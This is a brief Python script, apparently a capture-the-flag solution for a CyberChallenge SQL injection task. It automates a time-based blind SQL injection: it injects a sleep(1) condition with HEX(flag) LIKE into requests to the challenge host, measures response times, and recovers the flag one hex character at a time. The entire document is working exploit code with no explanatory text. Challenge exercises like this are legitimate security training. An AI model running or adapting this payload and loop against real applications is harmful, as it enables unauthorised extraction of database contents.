from inj_class import Inj
from time import time 


inj = Inj('http://sqlinjection.challs.cyberchallenge.it/')
payload = "1' and (select sleep(1) from flags where HEX(flag) LIKE '{}%')='1"
dictionary = '0123456789abcdef'
result = ''
i = 0

while True:
    for c in dictionary:
        before_request = time()
        question = payload.format(result + c)
        print(question)
        response, error = inj.time(question)
        total_time = time()-before_request 
        
        if total_time > 1:
            print('found one')
            # match!
            result += c
            break
    else:
        break # yup, for loops in python have an else condition'''
print(bytes.fromhex(result))